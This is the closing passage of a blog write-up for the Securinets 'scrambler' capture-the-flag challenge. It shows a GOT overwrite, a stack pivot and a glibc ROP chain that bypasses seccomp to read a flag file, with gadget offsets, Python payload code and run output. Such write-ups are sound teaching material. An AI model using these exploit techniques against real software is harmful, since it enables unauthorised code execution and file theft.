+1) Try scrambling
+2) Quit
+&gt; 2
+Good bye!
+
+Breakpoint 1, <span class=code-dark-blue>0x0000000000401555</span> in <span class=code-dark-yellow>??</span> ()  
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  got
+
+GOT protection: Partial RelRO | GOT functions: 11
+
+[0x404018] <span class=code-dark-green>seccomp_init  →  0x7ffff7f94780</span>
+[0x404020] <span class=code-dark-green>seccomp_rule_add  →  0x7ffff7f94e50</span>
+[0x404028] <span class=code-dark-green>puts@GLIBC_2.2.5  →  0x7ffff7e24450</span>
+[0x404030] <span class=code-dark-green>seccomp_load  →  0x7ffff7f94a90</span>
+[0x404038] <span class=code-dark-yellow>__stack_chk_fail@GLIBC_2.4  →  0x401070</span>
+[0x404040] <span class=code-dark-green>printf@GLIBC_2.2.5  →  0x7ffff7e01cc0</span>
+[0x404048] <span class=code-dark-yellow>srand@GLIBC_2.2.5  →  0x401090</span>
+[0x404050] <span class=code-dark-yellow>time@GLIBC_2.2.5  →  0x4010a0</span>
+[0x404058] <span class=code-dark-green>setvbuf@GLIBC_2.2.5  →  0x7ffff7e24d10</span>
+[0x404060] <span class=code-dark-green>__isoc99_scanf@GLIBC_2.7  →  0x7ffff7e030e0</span>  
+[0x404068] <span class=code-dark-yellow>rand@GLIBC_2.2.5  →  0x4010d0</span>
+</code></pre></div><p>The ones in green are already resolved. And the ones in yellow are not resolved because hte have not been called up to this point of execution.</p><p>Initialy, I modified the entry for <code>__stack_chk_fail</code> by the entry for <code>rand</code>. So I only needed to modify one byte (namely, change <code>0x70</code> for <code>0xd0</code>).</p><p>Again, we need to calculate the offset to this address. This time is easier because we know <code>$rbp = 0x404200</code>. So the offset we need to reach <code>0x404038</code> (GOT entry for <code>__stack_chk_fail</code>) is <code>-0x200 + 0x38 + 0x20</code> (recall that the base address for the &ldquo;write-what-where&rdquo; primitive is <code>$rbp - 0x20</code>). So we have to add this line of code:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>    <span class=mtk8>write_what_where</span><span class=mtk1>(</span><span class=mtk1>p</span><span class=mtk1>,</span> <span class="mtk7 mtki">0x</span><span class=mtk6>d0</span><span class=mtk1>,</span> <span class=mtk5>-</span><span class="mtk7 mtki">0x</span><span class=mtk6>200</span> <span class=mtk5>+</span> <span class="mtk7 mtki">0x</span><span class=mtk6>38</span> <span class=mtk5>+</span> <span class="mtk7 mtki">0x</span><span class=mtk6>20</span><span class=mtk1>)</span>  
+</code></pre></div><p>At this point, I started testing the second ROP chain. But&mldr; It didn&rsquo;t work either because the <code>$rsp</code> was pointing to stack addresses, so I was not able to modify the return instruction (which is stored in the stack) because <code>$rbp</code> points to the binary address space (there are no fix offsets between the stack address space, the binary and Glibc).</p><p>Again, another problem. To solve it, since <code>$rbp</code> is forced to be set to a valid address and we only have the binary addresses, we need to change <code>$rsp</code> as well. This technique is called Stack Pivot, and consists of moving the stack pointer to a controlled address space.</p><p>In order to perform a Stack Pivot, we need a gadget like <code>leave; ret</code>, which is equivalent to <code>mov rsp, rbp; pop rbp; ret</code>. Fortunately, we have this gadget in the binary:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ROPgadget</span> --binary <span class=mtku>scrambler</span> | <span class=code-dark-green>grep</span> <span class=code-dark-yellow>': leave ; ret$'</span>  
+0x0000000000401387 <span class=code-red>: leave ; ret</span>
+</code></pre></div><p>Therefore, instead of forging <code>__stack_chk_fail</code> to be <code>rand</code>, we can forge it to contain the address of the <code>leave; ret</code> gadget and perform the Stack Pivot technique. For that, we need to modify two bytes: <code>0x70</code> to be <code>0x87</code> and <code>0x10</code> to be <code>0x13</code>, which is done with these lines of code (that replace the previous one):</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>    <span class=mtk8>write_what_where</span><span class=mtk1>(</span><span class=mtk1>p</span><span class=mtk1>,</span> <span class="mtk7 mtki">0x</span><span class=mtk6>87</span><span class=mtk1>,</span> <span class=mtk5>-</span><span class="mtk7 mtki">0x</span><span class=mtk6>200</span> <span class=mtk5>+</span> <span class="mtk7 mtki">0x</span><span class=mtk6>38</span> <span class=mtk5>+</span> <span class="mtk7 mtki">0x</span><span class=mtk6>20</span><span class=mtk1>)</span>
+    <span class=mtk8>write_what_where</span><span class=mtk1>(</span><span class=mtk1>p</span><span class=mtk1>,</span> <span class="mtk7 mtki">0x</span><span class=mtk6>13</span><span class=mtk1>,</span> <span class=mtk5>-</span><span class="mtk7 mtki">0x</span><span class=mtk6>200</span> <span class=mtk5>+</span> <span class="mtk7 mtki">0x</span><span class=mtk6>38</span> <span class=mtk5>+</span> <span class="mtk7 mtki">0x</span><span class=mtk6>20</span> <span class=mtk5>+</span> <span class=mtk6>1</span><span class=mtk1>)</span>  
+</code></pre></div><p>Surprisingly, everything is working as expected. Now we get an interactive process and the saved return address will be taken from the new stack, which is within the binary addresses. We need to do the trick to get unlimited &ldquo;scrambles&rdquo; again. Now it is time to perform the second ROP chain.</p><p>This ROP chain is a bit complex, so I&rsquo;ll break it into pieces:</p><ol><li>Write <code>"/home/ctf/flag.txt"</code> at a known address</li><li>Open the flag file</li><li>Read the flag file and store its contents at a known address</li><li>Print the contents of the flag file</li></ol><p>Since we have leaked Glibc, we have access to a lot of useful gadgets and functions. One can get these gadgets using <code>ROPgadget</code> in the <code>libc.so_1.6</code> file. These are all the gadgets we are going to need (appart from <code>pop rdi; ret</code>):</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>    <span class=mtk1>mov_qword_ptr_rax_rdi_ret</span> <span class=mtk5>=</span> <span class=mtk1>glibc</span><span class=mtk1>.</span><span class=mtk1>address</span> <span class=mtk5>+</span> <span class="mtk7 mtki">0x</span><span class=mtk6>09a0ff</span>  
+    <span class=mtk1>pop_rax_ret</span>               <span class=mtk5>=</span> <span class=mtk1>glibc</span><span class=mtk1>.</span><span class=mtk1>address</span> <span class=mtk5>+</span> <span class="mtk7 mtki">0x</span><span class=mtk6>047400</span>
+    <span class=mtk1>pop_rsi_ret</span>               <span class=mtk5>=</span> <span class=mtk1>glibc</span><span class=mtk1>.</span><span class=mtk1>address</span> <span class=mtk5>+</span> <span class="mtk7 mtki">0x</span><span class=mtk6>02604f</span>
+    <span class=mtk1>pop_rdx_pop_r12_ret</span>       <span class=mtk5>=</span> <span class=mtk1>glibc</span><span class=mtk1>.</span><span class=mtk1>address</span> <span class=mtk5>+</span> <span class="mtk7 mtki">0x</span><span class=mtk6>119241</span>
+    <span class=mtk1>pop_rcx_pop_rbx_ret</span>       <span class=mtk5>=</span> <span class=mtk1>glibc</span><span class=mtk1>.</span><span class=mtk1>address</span> <span class=mtk5>+</span> <span class="mtk7 mtki">0x</span><span class=mtk6>1025ae</span>
+</code></pre></div><p>For the first piece, we will use this payload in a loop:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>    <span class=mtk1>flag</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'/home/ctf/flag.txt'</span>
+    <span class=mtk1>flag</span> <span class=mtk5>=</span> <span class=mtk1>flag</span><span class=mtk1>.</span><span class=mtk8>ljust</span><span class=mtk1>(</span><span class=mtk8>len</span><span class=mtk1>(</span><span class=mtk1>flag</span><span class=mtk1>)</span> <span class=mtk5>+</span> <span class=mtk1>(</span><span class=mtk6>8</span> <span class=mtk5>-</span> <span class=mtk8>len</span><span class=mtk1>(</span><span class=mtk1>flag</span><span class=mtk1>)</span> <span class=mtk5>%</span> <span class=mtk6>8</span><span class=mtk1>),</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span><span class=mtk1>)</span>  
+    <span class=mtk1>writable_addr</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>404000</span>
+
+    <span class=mtk1>payload</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>''</span>
+
+    <span class=mtk3>#</span> <span class=mtk3>Store</span> <span class=mtk3>"/home/ctf/flag.txt"</span> <span class=mtk3>in</span> <span class=mtk3>writable_addr</span>
+    <span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk8>len</span><span class=mtk1>(</span><span class=mtk1>flag</span><span class=mtk1>),</span> <span class=mtk6>8</span><span class=mtk1>):</span>
+        <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rdi_ret</span><span class=mtk1>)</span>
+        <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>flag</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>:</span><span class=mtk1>i</span> <span class=mtk5>+</span> <span class=mtk6>8</span><span class=mtk1>]</span>
+        <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rax_ret</span><span class=mtk1>)</span>
+        <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>writable_addr</span> <span class=mtk5>+</span> <span class=mtk1>i</span><span class=mtk1>)</span>
+        <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>mov_qword_ptr_rax_rdi_ret</span><span class=mtk1>)</span>
+</code></pre></div><p>The flag filename string is padded with null bytes to have a length that is divisible by <code>8</code>. Then, we are storing the string in chunks of <code>8</code> bytes in a writable address (namely, <code>0x404000</code>). The process uses <code>mov qword ptr [rax], rdi; ret</code> to store the contents of <code>$rdi</code> into the address pointed to by <code>$rax</code>. GDB might be useful to follow the ROP chain and make sure that the string is stored correctly.</p><p>After that, we must call <code>open("/home/ctf/flag.txt", O_RDONLY)</code>. Notice that <code>O_RDONLY</code> is just an alias for <code>0</code> and that we know the address of the filename string.</p><p>At first, I was using directly the <code>open</code> function from Glibc, but <code>seccomp</code> rules were blocking the process. Maybe that function uses more system calls. Then I looked for a <code>syscall</code> gadget: the binary does not contain any <code>syscall</code> and Glibc has a lot, but none of them end in <code>ret</code>, so we can&rsquo;t use them for the ROP chain:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ROPgadget</span> --binary <span class=mtku>scrambler</span> | <span class=code-dark-green>grep</span> syscall
+
+<span class=code-cyan>$</span> <span class=code-dark-green>ROPgadget</span> --binary <span class=mtku>libc.so_1.6</span> | <span class=code-dark-green>grep</span> syscall | <span class=code-dark-green>wc</span> -c
+153930
+
+<span class=code-cyan>$</span> <span class=code-dark-green>ROPgadget</span> --binary <span class=mtku>libc.so_1.6</span> | <span class=code-dark-green>grep</span> syscall | <span class=code-dark-green>grep</span> ret$  
+</code></pre></div><p>Again, a dead end&mldr; But then I realized that Glibc has a function called precisely <code>syscall</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>readelf</span> -s <span class=mtku>libc.so_1.6</span> | <span class=code-dark-green>grep</span> syscall
+  1980: 0000000000118750    55 FUNC    GLOBAL DEFAULT   15 <span class=code-red>syscall</span>@@GLIBC_2.2.5  
+</code></pre></div><p>So maybe we can use that function call in the ROP chain, that would solve the problem. One thing to take into account is that the values of the registers to execute a <code>syscall</code> (<code>$rax</code>, <code>$rdi</code>, <code>$rsi</code>, <code>$rdx</code>, <code>$rcx</code>&mldr;) are passed to the function <code>syscall</code> as arguments, so the <code>$rdi</code> = <code>$rax</code>, <code>$rsi</code> = <code>$rdi</code>, <code>$rdx</code> = <code>$rsi</code>, <code>$rcx</code> = <code>$rdx</code>&mldr; It can be a bit confusing, so I added some comments in the code:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>    <span class=mtk3>#</span> <span class=mtk3>syscall:</span> <span class=mtk3>open("/home/ctf/flag.txt",</span> <span class=mtk3>0)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rdi_ret</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk6>2</span><span class=mtk1>)</span>                         <span class=mtk3>#</span> <span class=mtk3>rdi</span> <span class=mtk3>(rax)</span>  
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rsi_ret</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>writable_addr</span><span class=mtk1>)</span>             <span class=mtk3>#</span> <span class=mtk3>rsi</span> <span class=mtk3>(rdi)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rdx_pop_r12_ret</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk6>0</span><span class=mtk1>)</span>                         <span class=mtk3>#</span> <span class=mtk3>rdx</span> <span class=mtk3>(rsi)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk6>0</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>syscall</span><span class=mtk1>)</span>
+</code></pre></div><p>The instruction <code>sys_open</code> is executed when <code>$rax = 2</code>. Next, we must use <code>sys_read</code> (<code>$rax = 0</code>). The file descriptor will be <code>3</code> (because <code>0</code>, <code>1</code> and <code>2</code> are reserved ones for <code>stdin</code>, <code>stdout</code> and <code>stderr</code>). Anyway, one can check the file descriptor number when executing <code>sys_open</code>, the resulting file descriptor will be returned in <code>$rax</code> (and it is <code>3</code>). So here is the <code>sys_read</code> ROP chain:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>    <span class=mtk3>#</span> <span class=mtk3>syscall:</span> <span class=mtk3>read(3,</span> <span class=mtk3>writable_addr,</span> <span class=mtk3>0x100)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rdi_ret</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk6>0</span><span class=mtk1>)</span>                         <span class=mtk3>#</span> <span class=mtk3>rdi</span> <span class=mtk3>(rax)</span>  
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rsi_ret</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk6>3</span><span class=mtk1>)</span>                         <span class=mtk3>#</span> <span class=mtk3>rsi</span> <span class=mtk3>(rdi)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rdx_pop_r12_ret</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>writable_addr</span><span class=mtk1>)</span>             <span class=mtk3>#</span> <span class=mtk3>rdx</span> <span class=mtk3>(rsi)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk6>0</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rcx_pop_rbx_ret</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class="mtk7 mtki">0x</span><span class=mtk6>100</span><span class=mtk1>)</span>                     <span class=mtk3>#</span> <span class=mtk3>rcx</span> <span class=mtk3>(rdx)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk6>0</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>syscall</span><span class=mtk1>)</span>
+</code></pre></div><p>The number <code>0x100</code> is just to specify the amount of bytes to read from the file descriptor (presumably, we won&rsquo;t need that much).</p><p>Finally, to print out the flag, we could have used <code>sys_write</code> (following the same <code>syscall</code> ROP chain procedure), but I found it easier to use <code>puts</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>    <span class=mtk3># puts(writable_addr)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rdi_ret</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>writable_addr</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>glibc</span><span class=mtk1>.</span><span class=mtk1>sym</span><span class=mtk1>.puts)</span>  
+</code></pre></div><p>And that&rsquo;s it. Now we only need to use the &ldquo;write-what-where&rdquo; primitive the same way we did for the first ROP chain and run it using option <code>2</code>.</p><p>Let&rsquo;s try locally:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>echo</span> <span class=code-dark-yellow>'flag{this_is_the_flag!!}'</span> &gt; /home/ctf/flag.txt
+
+<span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>solve.py</span>
+[<span class=code-blue>*</span>] './scrambler_patched'
+    Arch:     amd64-64-little
+    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
+    Stack:    <span class=code-dark-green>Canary found</span>
+    NX:       <span class=code-dark-green>NX enabled</span>
+    PIE:      <span class=code-dark-red>No PIE (0x3ff000)</span>
+    RUNPATH:  <span class=code-dark-red>b'.'</span>
+[<span class=code-green>+</span>] Starting local process './scrambler_patched': pid 447414  
+[<span class=code-blue>*</span>] Leaked puts() address: 0x7f028c526450
+[<span class=code-blue>*</span>] Glibc base address: 0x7f028c4a2000
+[<span class=code-blue>*</span>] Switching to interactive mode
+Good bye!
+flag{this_is_the_flag!!}
+gi\x8c\x7f
+[<span class=code-blue>*</span>] Got EOF while reading in interactive
+<span class=code-red>$</span>
+</code></pre></div><p>It works!! Let&rsquo;s try remotely (it can take some time to run, around 10 minutes):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>solve.py</span> 20.203.124.220 1235
+[<span class=code-blue>*</span>] './scrambler_patched'
+    Arch:     amd64-64-little
+    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
+    Stack:    <span class=code-dark-green>Canary found</span>
+    NX:       <span class=code-dark-green>NX enabled</span>
+    PIE:      <span class=code-dark-red>No PIE (0x3ff000)</span>
+    RUNPATH:  <span class=code-dark-red>b'.'</span>
+[<span class=code-green>+</span>] Opening connection to 20.203.124.220 on port 1235: Done  
+[<span class=code-blue>*</span>] Leaked puts() address: 0x7f3c9865e450
+[<span class=code-blue>*</span>] Glibc base address: 0x7f3c985da000
+[<span class=code-blue>*</span>] Switching to interactive mode
+Good bye!
+Securinets{f8ee583021b816b1b557987ca120991a}
+\x7f
+[<span class=code-blue>*</span>] Got EOF while reading in interactive
+<span class=code-red>$</span>
+</code></pre></div><p>The full exploit script can be found in here: <a href=https://github.com/7Rocky/CTF-scripts/blob/main/Securinets/scrambler/solve.py><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div></article></main><footer class="bg-black bottom-0 w-100 pa3" role=contentinfo><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a><div style=margin-top:8px><div><div><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></footer></body></html>
